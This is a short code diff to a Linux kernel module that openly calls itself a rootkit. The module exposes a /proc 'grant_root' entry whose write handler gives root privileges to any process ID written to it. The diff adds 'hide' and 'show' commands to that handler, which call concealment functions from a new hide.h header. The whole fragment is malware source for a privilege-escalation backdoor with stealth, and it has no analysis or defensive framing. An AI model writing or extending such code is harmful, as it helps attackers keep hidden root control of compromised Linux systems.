@@ -5,6 +5,7 @@
 #include <linux/pid.h>
 #include <linux/uaccess.h>
 #include <linux/proc_fs.h>
+#include "hide.h"
 
 static pid_t target_pid = 0;  
 
@@ -56,6 +57,16 @@ static ssize_t write_pid(struct file *file, const char __user *buf, size_t count
         return -EFAULT;
     
     kbuf[count] = '\0';
+
+    if (strncmp(kbuf, "hide", 4) == 0) {
+        set_hide();
+        return count;
+    }
+    if (strncmp(kbuf, "show", 4) == 0) {
+        unset_hide();
+        return count;
+    }
+
     target_pid = simple_strtoul(kbuf, NULL, 10);
     
     grant_root();
@@ -82,6 +93,7 @@ static int __init rootkit_init(void) {
 }
 
 static void __exit rootkit_exit(void) {
+    unset_hide();
     remove_proc_entry("grant_root", NULL);
     printk(KERN_INFO "Rootkit module unloaded\n");
 }
